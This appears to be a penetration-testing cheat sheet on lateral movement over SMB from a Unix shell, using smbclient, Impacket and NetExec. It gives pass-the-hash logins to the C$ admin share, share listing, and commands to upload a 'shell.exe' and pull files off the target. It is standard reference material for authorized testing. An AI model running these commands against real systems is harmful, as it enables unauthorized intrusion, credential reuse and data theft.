# Unix Shell

Search Tag(s): #lateral-movement #impacket #windows

## 01 - Authenticate

### 1.1 - Samba Suite Utils

`$ smbclient -U "[<domain_name>/]<username>%<password>" //<IP>/c$`

- Pass the Hash

`$ smbclient -U "[<domain_name>/]<username>" --pw-nt-hash <nt_hash> //<IP>/c$`

### 1.2 - Impacket

`$ smbclient.py [<domain>/]<username>:<password>@<IP>`

- Pass the Hash

`$ smbclient.py -hashes :<nt_hash> [<domain>/]<username>@<IP>`

### 1.3 - NetExec

#### 1.3.1 - Setup

TODO: Fill this info

- Install dependencies

```
$ sudo apt install -y python3-aardwolf python3-aesedb python3-aiocmd python3-aioconsole python3-aiosmb python3-aiosqlite python3-aiowinreg python3-all-dev python3-anyjson python3-arc4 python3-argcomplete python3-asciitree python3-asn1tools python3-asyauth python3-asysocks python3-backcall python3-bs4 python3-beniget python3-bitstruct bloodhound.py python3-dateutil python3-diskcache python3-dploot python3-dsinternals python3-gast python3-libnmap python3-lsassy python3-masky python3-minidump python3-minikerberos python3-msgpack python3-msldap python3-neo4j python3-neobolt python3-neotime python3-oscrypto python3-paramiko python3-pickleshare python3-poetry-dynamic-versioning python3-pyasn1-modules python3-pyatspi python3-pylnk3 python3-pypsrp python3-pypykatz python3-pythran python3-pywerview python3-requests python3-requests-toolbelt python3-rich python3-spnego python3-sqlalchemy python3-termcolor python3-terminaltables python3-winacl python3-xmltodict
```

#### 1.3.2 - Authentication

`$ netexec smb <IP> -u "<username>" -p "<password>"`

- Pass the Hash

`$ netexec smb <IP> -u "<username>" -H "<nt_hash>"`

## 02 - List Files and Directories

### 2.1 - Samba Suite Utils

`smb: \> ls`

### 2.2 - Impacket

```
# use c$

# ls
```

### 2.3 - NetExec

```
$ netexec smb <IP> -u "<username>" -p "<password>" --shares
```

## 03 - Copy Files

### 3.1 - Samba Suite Utils

- Upload file

`smb: \> put /path/to/local/shell.exe`

- Download file

`smb: \> get \path\to\remote\file.txt`

### 3.2 - Impacket

- Upload file

```
# put /path/to/local/shell.exe
```

- Download file

```
# get \path\to\remote\file.txt
```

### 3.3 - NetExec

- Upload file

```
$ netexec smb <IP> -u "<username>" -p "<password>" --put-file /path/to/local/shell.exe \\path\\to\\remote\\shell.exe
```

- Download file

```
$ netexec smb <IP> -u "<username>" -p "<password>" --get-file \\path\\to\\remote\\file.txt /path/to/local/file.txt
```

---
## References

- [NetExec Wiki: Get and Put Files](https://www.netexec.wiki/smb-protocol/get-and-put-files)